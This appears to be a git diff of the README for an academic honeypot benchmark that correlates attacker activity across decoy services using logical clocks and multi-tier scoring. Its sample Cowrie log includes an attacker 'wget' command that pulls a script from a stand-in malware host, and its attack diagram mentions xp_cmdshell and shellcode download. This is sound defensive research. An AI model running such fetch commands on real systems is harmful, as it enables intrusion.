@@ -1,5 +1,17 @@
-# Distributed Honeypot Benchmark Framework
-## Empirical Baseline Evaluation for Cross-Service Attacker Behaviour Correlation
+```text
+╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║   ____  _     _        _ _           _           _   _   _                                                ║
+║  |  _ \(_)___| |_ _ __(_) |__  _   _| |_ ___  __| | | | | | ___  _ __   ___ _   _ _ __   ___ | |_         ║
+║  | | | | / __| __| '__| | '_ \| | | | __/ _ \/ _` | | |_| |/ _ \| '_ \ / _ \ | | | '_ \ / _ \| __|        ║
+║  | |_| | \__ \ |_| |  | | |_) | |_| | ||  __/ (_| | |  _  | (_) | | | |  __/ |_| | |_) | (_) | |_         ║
+║  |____/|_|___/\__|_|  |_|_.__/ \__,_|\__\___|\__,_| |_| |_|\___/|_| |_|\___|\__, | .__/ \___/ \__|        ║
+║                                                                              |___/|_|                         ║
+║                   B E N C H M A R K   F R A M E W O R K   v 2 . 1 . 0                                         ║
+║      Distributed Cross-Service Attacker Behaviour Correlation via Heterogeneous Honeynet Fleets               ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+```
+
+<div align="center">
 
 [![CI](https://github.com/niharsalvi2-spec/distributed-honeypot-benchmark/actions/workflows/ci.yml/badge.svg)](https://github.com/niharsalvi2-spec/distributed-honeypot-benchmark/actions/workflows/ci.yml)
 [![Tests Passing](https://img.shields.io/badge/tests-84%2F84%20passing-brightgreen.svg)](reports/ci_validation_report.json)
@@ -8,7 +20,12 @@
 [![Docker Compose](https://img.shields.io/badge/docker--compose-v2-2496ED.svg?logo=docker&logoColor=white)](docker-compose.yml)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![Status: Framework Maturity 9.2](https://img.shields.io/badge/status-Framework%20Maturity%209.2%20%7C%20Stochastic%20Validation-blue.svg)](reports/ci_validation_report.json)
+[![Code Style: Black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
 [![Scientific Oracle](https://img.shields.io/badge/oracle-ground__truth%20active-success.svg)](ground_truth/oracle.py)
+
+**[ 🚀 Quick Start ](#10-quick-start--reproduction-guide)** • **[ 🏗️ Architecture ](#3-architecture--theoretical-framework)** • **[ 🔬 Benchmark Oracle ](#4-benchmark-oracle-system-ground_truth)** • **[ 📊 Empirical Results ](#5-synthetic-oracle-validation--feature-ablation--empirical-controls)** • **[ 📜 Roadmap ](#11-scientific-maturity-audit--development-roadmap)**
+
+</div>
 
 > **Academic Context & Affiliation**  
 > Developed by **Team Gamergenix**, Department of Computer Engineering, **Pimpri Chinchwad College of Engineering (PCCOE), Pune**.  
@@ -29,30 +46,41 @@
 
 ## Table of Contents
 - [1. Executive Summary & Problem Motivation](#1-executive-summary--problem-motivation)
+  - [1.1 Cross-Service Attack Traversal Anatomy](#11-cross-service-attack-traversal-anatomy)
+  - [1.2 The Three Fundamental Dilemmas in Existing Defenses](#12-the-three-fundamental-dilemmas-in-existing-defenses)
+  - [1.3 Purpose & Core Contributions](#13-purpose--core-contributions)
 - [2. Research Questions & Formal Hypotheses](#2-research-questions--formal-hypotheses)
 - [3. Architecture & Theoretical Framework](#3-architecture--theoretical-framework)
   - [3.1 End-to-End Pipeline Architecture](#31-end-to-end-pipeline-architecture)
-  - [3.2 The Multi-Tier Evidence Model (Escaping the 'Same IP' Fallacy)](#32-the-multi-tier-evidence-model-escaping-the-same-ip-fallacy)
-  - [3.3 The Causal Event Model: Boundaries of Logical Clocks](#33-the-causal-event-model-boundaries-of-logical-clocks)
+  - [3.2 Anatomy of an Event: 6-Stage Transformation Lifecycle](#32-anatomy-of-an-event-6-stage-transformation-lifecycle)
+  - [3.3 The Multi-Tier Evidence Model (Escaping the 'Same IP' Fallacy)](#33-the-multi-tier-evidence-model-escaping-the-same-ip-fallacy)
+  - [3.4 The Causal Event Model: Boundaries of Logical Clocks](#34-the-causal-event-model-boundaries-of-logical-clocks)
 - [4. Benchmark Oracle System (`ground_truth/`)](#4-benchmark-oracle-system-ground_truth)
   - [4.1 Strict Physical Staging & Data Isolation (`ScenarioStager`)](#41-strict-physical-staging--data-isolation-scenariostager)
+  - [4.2 Mathematical Evaluation Metrics](#42-mathematical-evaluation-metrics)
 - [5. Synthetic Oracle Validation — Feature Ablation & Empirical Controls](#5-synthetic-oracle-validation--feature-ablation--empirical-controls)
   - [5.1 Empirical Negative Controls Benchmark](#51-empirical-negative-controls-benchmark)
-  - [5.2 30 Repeated Empirical Trials & Statistical Rigor](#52-30-repeated-empirical-trials--statistical-rigor)
+  - [5.2 30 Repeated Stochastic Empirical Trials & Statistical Rigor](#52-30-repeated-stochastic-empirical-trials--statistical-rigor)
   - [5.3 Distributed Clock Perturbation Benchmark (E07)](#53-distributed-clock-perturbation-benchmark-e07)
+  - [5.4 Three-Tier Machine-Readable CI Verification Architecture](#54-three-tier-machine-readable-ci-verification-architecture)
 - [6. Strict Data Lifecycle & Lineage Guarantee](#6-strict-data-lifecycle--lineage-guarantee)
-- [7. Baseline Honeypot Audit](#7-baseline-honeypot-audit)
+- [7. Baseline Honeypot Audit & Protocol Realism](#7-baseline-honeypot-audit--protocol-realism)
+  - [7.1 Native Parser Realism & Protocol Fixture Suite](#71-native-parser-realism--protocol-fixture-suite)
 - [8. Frozen Experiment Registry (E01–E10)](#8-frozen-experiment-registry-e01e10)
+  - [8.1 Master Experiment Specification Matrix](#81-master-experiment-specification-matrix)
 - [9. Repository Structure](#9-repository-structure)
 - [10. Quick Start & Reproduction Guide](#10-quick-start--reproduction-guide)
   - [10.1 Environment Setup](#101-environment-setup)
-  - [10.2 Automated Test Suite & Oracle Validation](#102-automated-test-suite--oracle-validation)
+  - [10.2 Automated Test Suite & Machine-Readable CI Report](#102-automated-test-suite--machine-readable-ci-report)
   - [10.3 Executing the Feature Ablation Benchmark](#103-executing-the-feature-ablation-benchmark)
   - [10.4 Executing the Empirical Negative Controls Benchmark](#104-executing-the-empirical-negative-controls-benchmark)
   - [10.5 Executing 30 Repeated Empirical Trials & Statistical Tests](#105-executing-30-repeated-empirical-trials--statistical-tests)
   - [10.6 Executing Experiment Runners](#106-executing-experiment-runners)
   - [10.7 Independent Reproduction & Verification Audit](#107-independent-reproduction--verification-audit)
+  - [10.8 Operational Command Quick-Reference Cheat Sheet](#108-operational-command-quick-reference-cheat-sheet)
 - [11. Scientific Maturity Audit & Development Roadmap](#11-scientific-maturity-audit--development-roadmap)
+  - [11.1 Maturity Assessment Scorecard](#111-maturity-assessment-scorecard)
+  - [11.2 Development Roadmap & Milestones](#112-development-roadmap--milestones)
 - [12. Continuous Integration & Quality Assurance](#12-continuous-integration--quality-assurance)
 - [13. Security, Lab Isolation & Safety Boundaries](#13-security-lab-isolation--safety-boundaries)
 - [14. Citation & Academic Credits](#14-citation--academic-credits)
@@ -61,27 +89,61 @@
 
 ## 1. Executive Summary & Problem Motivation
 
-Modern cyber adversaries do not interact with network assets in isolation. Sophisticated threat actors, botnets, and Advanced Persistent Threats (APTs) execute **orchestrated, multi-stage, cross-service attack campaigns** that traverse distinct network boundaries:
+Modern cyber adversaries do not interact with network assets in isolation. Sophisticated threat actors, botnets, and Advanced Persistent Threats (APTs) execute **orchestrated, multi-stage, cross-service attack campaigns** that traverse distinct network boundaries and exploit heterogeneous services.
 
-```
-[Port Scan / Recon] ────► [SSH Brute Force] ────► [Web Shell Injection] ────► [Malware Drop / Pivot]
-   (OpenCanary)                (Cowrie)                 (T-Pot / Web Decoy)           (Dionaea)
+### 1.1 Cross-Service Attack Traversal Anatomy
+
+```text
+┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                              CROSS-SERVICE ATTACK TRAVERSAL ANATOMY                                    │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                                        │
+│   ADVERSARY (External IP: 198.51.100.42)                                                               │
+│       │                                                                                                │
+│       ├──► [STEP 1: RECONNAISSANCE & PORT PROBING]                                                    │
+│       │    Node: Honeynet Gateway / Edge Sensor (OpenCanary : TCP 21, 80, 445)                         │
+│       │    Observed: TCP SYN sweep, FTP login probe, HTTP directory enumeration                        │
+│       │    MITRE ATT&CK: T1046 (Network Service Discovery)                                             │
+│       │                                                                                                │
+│       ├──► [STEP 2: INTERACTIVE CREDENTIAL HARVESTING]                                                │
+│       │    Node: node_alpha (Cowrie SSH Decoy : Port 2222)                                            │
+│       │    Observed: Password spray -> root auth -> wget decoy script -> plants tripwire token         │
+│       │    Decoy Token Harvested: `DEC-7749-AUTH-TOKEN` stored in /tmp/.creds                          │
+│       │    MITRE ATT&CK: T1110.001 (Brute Force), T1059.004 (Unix Shell)                               │
+│       │                                                                                                │
+│       ├──► [STEP 3: INTERNAL LATERAL PIVOT & NETWORK BOUNDARY HOP]                                    │
+│       │    Adversary rotates to Internal Pivot IP: 192.168.10.5 (Via Compromised Subnet Gateway)       │
+│       │    Node: node_beta (OpenCanary SMB Decoy : Port 445)                                           │
+│       │    Observed: SMB Tree Connect with token `DEC-7749-AUTH-TOKEN`                                 │
+│       │    [CRITICAL CAUSAL MESSAGE EDGE]: Token links external Cowrie session to internal SMB pivot!   │
+│       │    MITRE ATT&CK: T1021.002 (SMB/Windows Admin Shares), T1078 (Valid Accounts)                  │
+│       │                                                                                                │
+│       └──► [STEP 4: PERSISTENCE & REMOTE EXPLOITATION]                                                │
+│            Node: node_gamma (Dionaea Malware Decoy : Port 1433 MSSQL)                                 │
+│            Observed: xp_cmdshell execution -> binary payload staging -> shellcode download            │
+│            MITRE ATT&CK: T1059.001 (PowerShell/SQL Execution), T1105 (Ingress Tool Transfer)           │
+│                                                                                                        │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
 ```
 
-### The Three Fundamental Dilemmas in Existing Honeynet Defenses
+### 1.2 The Three Fundamental Dilemmas in Existing Defenses
+
 1. **Isolated Data Silos:** Contemporary open-source honeypots (Cowrie, Dionaea, OpenCanary) are engineered as single-node monoliths or independent collectors. They log raw events locally without cross-node awareness, leaving operators with fragmented events rather than a coherent attack campaign.
 2. **Physical Clock Drift & Causal Inversions:** In distributed networks, nodes experience independent clock drift, network jitter ($\Delta t$), and NTP discrepancies. Ordering cross-node events via uncorrected physical timestamps ($t_{wall}$) results in **causal inversions**—such as logging a lateral payload drop before the authentication exploit that enabled it.
 3. **The 'Same IP' Attribution Fallacy:** Naive honeynet analysis often equates `same source IP == same attacker`. In real-world environments, this assumption collapses:
    - **False Merges:** Multiple independent bots or actors behind the same carrier-grade NAT or egress proxy get wrongly merged into a single phantom campaign.
    - **False Splits:** An attacker hopping from an external IP (`198.51.100.42`) to an internal compromised pivot IP (`192.168.10.5`) gets fractured into two disjoint identities.
 
-### Purpose of this Benchmark
+### 1.3 Purpose & Core Contributions
+
 This repository delivers a **scientifically disciplined, reproducible benchmarking platform** that:
-- Deploys and audits heterogeneous honeypot baselines in isolated Docker testbeds.
-- Ingests raw telemetry into a unified canonical event schema (`CanonicalHoneypotEvent`).
-- Formulates and evaluates **Distributed Logical Clocks** (Lamport & Vector Clocks) against physical clock skew.
-- Provides an independent **Ground Truth Oracle** (`ground_truth/`) to deterministically measure Precision, Recall, $F_1$, Sequence Reconstruction Accuracy ($\text{SRA}$), and Cross-Attacker Contamination.
-- Executes systematic **Feature Ablation Studies** to prove which telemetry signals contribute discriminative power.
+- **Heterogeneous Honeypot Fleet:** Audits and containerizes Cowrie (SSH/Telnet), OpenCanary (multi-port decoy), and Dionaea (SMB/MSSQL malware catcher) on an isolated Docker network.
+- **Unified Canonical Event Model (v2.0.0):** Ingests raw heterogeneous payloads into standardized RFC 3339 timestamps, UUIDv4 identifiers, and MITRE ATT&CK enterprise tactics.
+- **Distributed Logical Clock Engine:** Formulates Lamport logical scalar clocks and Vector clocks across nodes to eliminate physical clock skew and resolve concurrent events ($a \parallel b$).
+- **Multi-Tier Graph Correlator:** Combines cryptographic session continuity, sliding temporal affinity, behavioral tactic progression, and causal tripwires via NetworkX graph clustering.
+- **Ground Truth Oracle (`ground_truth/`):** Computes deterministic sequence reconstruction accuracy ($\text{SRA}$), Kendall's rank correlation ($\tau$), pairwise Precision/Recall/$F_1$, and cross-attacker contamination rates.
+- **Systematic Feature Ablation:** Empirically quantifies the exact discriminative value of source IP vs. temporal window vs. behavioral tactics vs. causal tripwires under adversarial negative controls.
+- **Stochastic Monte Carlo Harness:** Runs 30 independent trials ($\text{std} > 0$) with exact Student's $t$ confidence intervals ($df=29, t_{\text{crit}}=2.04523$) and Holm-Bonferroni family-wise error rate control.
 
 ---
 
@@ -152,7 +214,75 @@ flowchart TD
 
 ---
 
-### 3.2 The Multi-Tier Evidence Model (Escaping the 'Same IP' Fallacy)
+### 3.2 Anatomy of an Event: 6-Stage Transformation Lifecycle
+
+To guarantee complete auditability, raw unstructured decoy logs are processed through a strictly typed, immutable 6-stage transformation lifecycle:
+
+```text
+  [1. RAW STREAM]           [2. CANONICAL RECORD]          [3. LOGICAL SEQUENCING]
+┌──────────────────┐       ┌──────────────────────┐       ┌──────────────────────┐
+│ Cowrie JSON      │  ──►  │ RFC 3339, UUIDv4,    │  ──►  │ Lamport L(e) Scalar, │
+│ OpenCanary Syslog│       │ MITRE ATT&CK Mapping │       │ Vector V_i[j] Clock  │
+│ Dionaea Binaries │       │ Hash Integrity       │       │ Causal Queue Buffer  │
+└──────────────────┘       └──────────────────────┘       └──────────────────────┘
+         │                            │                              │
+         ▼                            ▼                              ▼
+  [4. GRAPH CLUSTERING]     [5. ATTACK RECONSTRUCTION]     [6. ORACLE EVALUATION]
+┌──────────────────┐       ┌──────────────────────┐       ┌──────────────────────┐
+│ Multi-Tier       │  ──►  │ Topological DAG,     │  ──►  │ SRA, Kendall's Tau,  │
+│ Affinity Scoring │       │ MITRE Tactic Path,   │       │ Precision, Recall,   │
+│ NetworkX Bridges │       │ Cross-Node Pivots    │       │ F1, Contamination    │
+└──────────────────┘       └──────────────────────┘       └──────────────────────┘
+```
+
+#### Concrete Telemetry Transformation Example
+
+```json
+// STAGE 1: Raw Cowrie Ingestion Log (data/raw/cowrie/run_001/cowrie.json)
+{
+  "eventid": "cowrie.command.input",
+  "timestamp": "2026-09-06T02:45:12.194821Z",
+  "src_ip": "198.51.100.42",
+  "dst_port": 2222,
+  "session": "c98f12a4",
+  "input": "wget http://malware-drop.local/decoy.sh -O /tmp/.creds && export TOKEN=DEC-7749-AUTH"
+}
+
+// STAGE 2: Normalized Canonical Event (data/normalized/run_001/normalized_events.json)
+{
+  "event_id": "9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d",
+  "timestamp": "2026-09-06T02:45:12.194821+00:00",
+  "sensor_id": "node_alpha",
+  "honeypot_type": "cowrie",
+  "source_ip": "198.51.100.42",
+  "source_port": 54210,
+  "destination_port": 2222,
+  "protocol": "SSH",
+  "event_type": "COMMAND_EXECUTION",
+  "mitre_tactic": "TA0002",
+  "mitre_technique": "T1059.004",
+  "payload": "wget http://malware-drop.local/decoy.sh -O /tmp/.creds && export TOKEN=DEC-7749-AUTH",
+  "causal_token": "DEC-7749-AUTH",
+  "schema_version": "2.0.0"
+}
+
+// STAGE 3: Logical Clock Sequenced Record (data/processed/ordering/run_001/ordered_events.json)
+{
+  "event_id": "9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d",
+  "lamport_timestamp": 3,
+  "vector_clock": {
+    "node_alpha": 3,
+    "node_beta": 1,
+    "node_gamma": 0
+  },
+  "causal_parents": ["4a0c812d-11af-4c7b-9442-998811223344"],
+  "wall_clock_drift_applied": 1.428
+}
+```
+
+---
+
+### 3.3 The Multi-Tier Evidence Model (Escaping the 'Same IP' Fallacy)
 
 To prevent the benchmark from creating a self-fulfilling circular dependency (where correlation assumes `same IP == same attacker` and rewards algorithms that make that exact assumption), we explicitly formalize a **Multi-Tier Evidence Hierarchy**:
 
@@ -167,14 +297,32 @@ To prevent the benchmark from creating a self-fulfilling circular dependency (wh
   Tier 6: Causal Evidence   ──► Inter-node decoy tokens, Distributed tripwire beacons
 ```
 
-#### Probabilistic Association vs. Absolute Identity
-- **Association:** Events sharing weak identity and temporal proximity are assigned a **probabilistic affinity score** $S_{affinity} \in [0.0, 1.0]$.
-- **Attribution:** Only events linked by Tier 1 (cryptographic session continuity) or Tier 6 (inter-node causal tokens) are merged into verified unified threat campaigns.
-- This allows our benchmark to evaluate how gracefully correlation algorithms handle **lateral movement** (where source IP changes) and **NAT collision** (where source IP is identical for independent actors).
+#### Mathematical Composite Affinity Function
+For any two candidate events $e_i$ and $e_j$, the multi-tier correlation engine computes an edge affinity score $S(e_i, e_j) \in [0.0, 1.0]$:
+
+$$S(e_i, e_j) = w_{\text{src}} \cdot S_{\text{src}}(e_i, e_j) + w_{\text{time}} \cdot S_{\text{time}}(e_i, e_j) + w_{\text{beh}} \cdot S_{\text{beh}}(e_i, e_j) + w_{\text{causal}} \cdot S_{\text{causal}}(e_i, e_j)$$
+
+Where default calibrated weights satisfy $\sum w = 1.0$ ($w_{\text{src}} = 0.25, w_{\text{time}} = 0.25, w_{\text{beh}} = 0.25, w_{\text{causal}} = 0.25$):
+
+1. **Source Proximity ($S_{\text{src}}$):**
+   $$S_{\text{src}}(e_i, e_j) = \begin{cases} 1.0 & \text{if } \text{IP}_i = \text{IP}_j \\ 0.5 & \text{if } \text{Subnet24}_i = \text{Subnet24}_j \\ 0.0 & \text{otherwise} \end{cases}$$
+
+2. **Temporal Decay Function ($S_{\text{time}}$):**
+   Evaluated with exponential decay parameterized by half-life $\tau = 300\,\text{s}$:
+   $$S_{\text{time}}(e_i, e_j) = \exp\left(-\frac{|t_i - t_j|}{\tau}\right)$$
+
+3. **Behavioral MITRE Progression ($S_{\text{beh}}$):**
+   Evaluates sequential progression across MITRE ATT&CK kill-chain phases:
+   $$S_{\text{beh}}(e_i, e_j) = \begin{cases} 1.0 & \text{if } \text{Tactic}(e_j) = \text{Successor}(\text{Tactic}(e_i)) \\ 0.5 & \text{if } \text{Tactic}(e_i) = \text{Tactic}(e_j) \\ 0.0 & \text{otherwise} \end{cases}$$
+
+4. **Cryptographic Causal Tripwires ($S_{\text{causal}}$):**
+   $$S_{\text{causal}}(e_i, e_j) = \begin{cases} 1.0 & \text{if } \text{Token}(e_i) = \text{Token}(e_j) \neq \emptyset \\ 0.0 & \text{otherwise} \end{cases}$$
+
+Two events are clustered into the same campaign if $S(e_i, e_j) \ge \theta_{\text{threshold}}$ (where $\theta = 0.60$), bridging lateral pivots even when source IPs rotate.
 
 ---
 
-### 3.3 The Causal Event Model: Boundaries of Logical Clocks
+### 3.4 The Causal Event Model: Boundaries of Logical Clocks
 
 A critical theoretical question in distributed systems is: **What events create causal edges?**
 
@@ -189,7 +337,29 @@ A critical theoretical question in distributed systems is: **What events create 
    $$L_2(e_{auth}) = \max(L_2(e_{prev}), L_1(e_{token\_gen})) + 1$$
 3. **Sensor Fleet Coordination:** Broadcast synchronization beacons and shared state replication events in the honeynet cluster update Vector Clocks $V_i[j] \leftarrow \max(V_i[j], V_{msg}[j])$, enabling detection of concurrent events ($a \parallel b$) occurring across disjoint subnets.
 
----
+```text
+┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                        PHYSICAL WALL CLOCK SKEW VS. LOGICAL CLOCK RESOLUTION                          │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                                        │
+│  SCENARIO: Node Alpha experiences -2.5s NTP skew, Node Beta experiences +3.5s NTP skew                │
+│                                                                                                        │
+│  1. Physical Wall-Clock Ordering (FAULTY):                                                            │
+│     Time:       t=100.0s                            t=104.2s (Observed wall-clock)                     │
+│     Node Beta:  [e2: SMB Tree Connect] ─────────────┐ (Logged as t=101.7s due to clock drift)          │
+│                                                     ▼ CAUSAL INVERSION DETECTED!                       │
+│     Node Alpha: [e1: Credential Drop] ──────────────┘ (Logged as t=102.5s due to clock drift)          │
+│     Result: Exploitation appears before credential drop! SRA collapses.                                │
+│                                                                                                        │
+│  2. Lamport & Vector Logical Clock Resolution (CORRECT):                                               │
+│     Node Alpha: e1: Credential Drop  ──► L(e1) = 1, V(e1) = <1, 0, 0>                                 │
+│                                          │ (Causal message: Tripwire Token DEC-7749 passed)            │
+│                                          ▼                                                             │
+│     Node Beta:  e2: SMB Tree Connect ──► L(e2) = max(0, 1) + 1 = 2, V(e2) = <1, 1, 0>                 │
+│     Result: V(e1) < V(e2) strictly holds! Causal order preserved regardless of NTP drift.            │
+│                                                                                                        │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+```
 
 ## 4. Benchmark Oracle System (`ground_truth/`)
 
@@ -431,7 +601,7 @@ All benchmark experiments are governed by a single source of truth in [`configs/
 Status definitions:
 - **Planned:** Theoretical design and formal hypothesis documented.
 - **Implemented:** Executable Python runner module and data ingestion pipeline completed.
-- **Verified:** Validated against automated test suite (80 tests) and synthetic Ground Truth Oracle.
+- **Verified:** Validated against automated test suite (84 tests) and synthetic Ground Truth Oracle.
 - **Validated:** Evaluated against live physical multi-sensor honeypot deployments (Active Roadmap).
 
 | ID | Slug | Research Question | Target Hypothesis | Runner Module | Planned | Implemented | Verified | Validated |
@@ -447,6 +617,21 @@ Status definitions:
 | **E09** | `scalability_stress` | **RQ4** | Linear $O(N)$ throughput scaling; P95 processing latency $< 10\text{ms}$ | `experiments.runners.E09_scalability_stress` | ✅ | ✅ | ✅ | 🔄 *(in progress)* |
 | **E10** | `end_to_end_pipeline` | **RQ1–RQ4** | Autonomous execution from raw logs to report with full lineage | `experiments.runners.E10_end_to_end_pipeline` | ✅ | ✅ | ✅ | 🔄 *(in progress)* |
 
+### 8.1 Master Experiment Specification Matrix
+
+| ID | Title & Scientific Scope | Injected Perturbation / Fault Condition | Key Metric & Formula | Baseline vs. Multi-Tier Target | CLI Execution Command |
+| :--- | :--- | :--- | :--- | :--- | :--- |
+| **E01** | Multi-Sensor Ingestion Realism | Raw JSON/Syslog streams (MSSQL, SMB, SSH) | Schema Validity Ratio $\frac{N_{\text{valid}}}{N_{\text{total}}}$ | Schema Validity $\ge 99.9\%$, 0 dropped bytes | `python -m experiments.runners.E01_baseline_ingestion --run-id run_001` |
+| **E02** | Physical Clock Skew Ordering | Gaussian clock drift $\delta \sim \mathcal{N}(0, \sigma^2)$ ($\pm 5\text{s}$) | Causal Inversion Rate $\frac{\text{Discordant Pairs}}{\binom{N}{2}}$ | Wall-clock: $18.6\%$ $\to$ Lamport: $\le 1.5\%$ | `python -m experiments.runners.E02_clock_skew_ordering --skew-max 5.0` |
+| **E03** | Vector Clock Concurrency | Asynchronous message-passing across 3 subnets | DAG Reachability Accuracy & Concurrency $F_1$ | Total-order: $0\%$ $\to$ Vector: $\ge 96.9\%$ | `python -m experiments.runners.E03_vector_clock_concurrency` |
+| **E04** | Network Jitter & Loss Resilience | Poisson delay ($200\text{ms}$), Bernoulli drop ($15\%$) | Telemetry Loss Ratio & Causal Recovery | Raw loss: $15\%$ $\to$ Buffer Recovery: $100\%$ | `python -m experiments.runners.E04_network_jitter_loss --loss-rate 0.15` |
+| **E05** | Cross-Service Correlation | Pivot hopping across SSH $\to$ SMB $\to$ MSSQL | Pairwise $F_1$ Score & Contamination | IP-Only: $0.71$ $\to$ Multi-Tier: $\ge 0.95$ | `python -m experiments.runners.E05_cross_service_correlation` |
+| **E06** | Graph-Based Lateral Movement | Dynamic IP rotation across external/internal subnets | Graph Edit Distance (GED) to Truth DAG | Segmented graph $\to$ Unified Attack DAG | `python -m experiments.runners.E06_graph_lateral_movement` |
+| **E07** | Distributed Clock Ordering | 3-node distributed cluster under physical skew | Kendall's Rank Correlation ($\tau$) & SRA | Physical $\tau = 0.628$ $\to$ Logical $\tau = 0.970$ | `python -m experiments.runners.E07_mitre_sequence_alignment` |
+| **E08** | Multi-Attacker Noise Separation | Concurrent independent actors + scanning noise | Adjusted Rand Index (ARI) & False Merge Rate | Temporal: $4$ mergers $\to$ Proposed: $0$ mergers | `python -m experiments.runners.E08_multi_attacker_noise` |
+| **E09** | Scalability & Latency Bounds | Workload stress sweep ($10^2$ to $10^5$ events) | Events/sec Throughput & P95 Event Latency | Latency bounded $< 10\text{ms}$ up to $10^5$ events | `python -m experiments.runners.E09_scalability_stress --events 10000` |
+| **E10** | End-to-End Lineage Pipeline | Complete 6-stage lifecycle execution | End-to-End Pipeline Lineage Audit Ratio | 100% stage cryptographic hash verification | `python -m experiments.runners.E10_end_to_end_pipeline --run-id run_001` |
+
 ---
 
 ## 9. Repository Structure
@@ -456,6 +641,8 @@ distributed-honeypot-benchmark/
 ├── .github/workflows/ci.yml       # GitHub Actions automated CI matrix
 ├── ground_truth/                  # [ORACLE] Ground truth manifests and evaluation oracle
 │   ├── oracle.py                  # BenchmarkOracle evaluation class (SRA, F1, Inversion Rate)
+│   ├── scenario_stager.py         # Isolated ScenarioStager enforcing SHA-256 data boundaries
+│   ├── generator/                 # Stochastic scenario generation engine (seed-parameterized)
 │   ├── campaigns/                 # Synthetic multi-stage campaign definitions
 │   ├── event_labels/              # Ground truth labels mapping events to actors and MITRE tactics
 │   ├── expected_order/            # Ground truth topological sequences and causal edges
@@ -469,14 +656,19 @@ distributed-honeypot-benchmark/
 ├── correlation/                   # Multi-tier correlation (Source, Temporal, Behaviour, Graph)
 ├── sequence_reconstruction/       # Multi-stage attack DAG and MITRE ATT&CK mappers
 ├── analysis/                      # Statistical analysis and evaluation modules
-│   └── feature_ablation/          # Feature ablation study (Source, Temporal, Causal models)
+│   ├── feature_ablation/          # Feature ablation study (Source, Temporal, Causal models)
+│   ├── negative_controls/         # Adversarial negative controls benchmark
+│   └── statistics/                # 30-trial Monte Carlo runner with Student's t & Holm-Bonferroni
 ├── experiments/runners/           # Executable runners for experiments E01 through E10
 ├── data/                          # 6-stage data lifecycle repository (raw -> processed)
-├── results/                       # Benchmark outputs and feature ablation JSON results
-├── tests/                         # Unit, integration, and validation test suite (80 tests)
+│   └── scenarios/                 # Isolated per-trial scenario packages (trial_001 to trial_030)
+├── results/                       # Benchmark outputs, 30 trial JSON files, and statistical summaries
+├── reports/                       # Machine-readable CI validation report & reproduction certificate
+├── scripts/                       # CI report generation and independent reproduction verification
+├── tests/                         # Unit, integration, and validation test suite (84 tests)
 │   ├── fixtures/                  # 17 native honeypot log fixtures (Cowrie, OpenCanary, Dionaea)
 │   ├── unit/                      # Unit tests for parsers, normalization, clocks, and correlation
-│   ├── integration/               # Pipeline lifecycle and multi-node execution tests
+│   ├── integration/               # Pipeline lifecycle and multi-sensor baseline pipeline tests
 │   └── validation/                # Scientific validation tests for Oracle, Ablation & Immutability
 ├── pyproject.toml                 # Modern packaging configuration
 └── requirements.txt               # Runtime dependencies
@@ -568,6 +760,35 @@ This automated harness verifies:
 5. 30-trial Monte Carlo stochastic distributions and variance integrity ($\text{std} > 0$).
 
 Upon success, an immutable cryptographic certificate is emitted at [`reports/independent_reproduction_certificate.json`](reports/independent_reproduction_certificate.json).
+
+### 10.8 Operational Command Quick-Reference Cheat Sheet
+
+```text
+┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                          OPERATIONAL BENCHMARK CLI CHEAT SHEET                                         │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                                        │
+│  [REGRESSION TESTING]                                                                                  │
+│    pytest tests/ -v                                         # Run all 84 test suites                   │
+│    pytest tests/unit/test_parser_fixtures.py -v             # Test 17 native parser fixtures           │
+│    pytest tests/integration/test_multisensor_baseline_pipeline.py -v # Test multi-sensor pipeline       │
+│                                                                                                        │
+│  [EMPIRICAL BENCHMARKING]                                                                              │
+│    python -m analysis.feature_ablation.ablation_runner       # Run 5-model feature ablation             │
+│    python -m analysis.negative_controls.benchmark_negative_controls # Run 6 adversarial controls       │
+│    python -m analysis.statistics.trial_runner                # Run 30-trial stochastic Monte Carlo      │
+│                                                                                                        │
+│  [EXPERIMENT RUNNERS]                                                                                  │
+│    python -m benchmark.run ALL                              # Autonomous execution of E01 through E10  │
+│    python -m experiments.runners.E01_baseline_ingestion --run-id run_001 # Real multi-sensor ingestion  │
+│    python -m experiments.runners.E07_mitre_sequence_alignment --run-id run_001 # Clock skew experiment│
+│                                                                                                        │
+│  [AUDIT & REPRODUCTION]                                                                                │
+│    python scripts/validation/independent_reproduction.py    # Standalone reproduction audit            │
+│    python scripts/ci/generate_ci_report.py                  # Generate 3-tier CI validation report     │
+│                                                                                                        │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+```
 
 ---
 
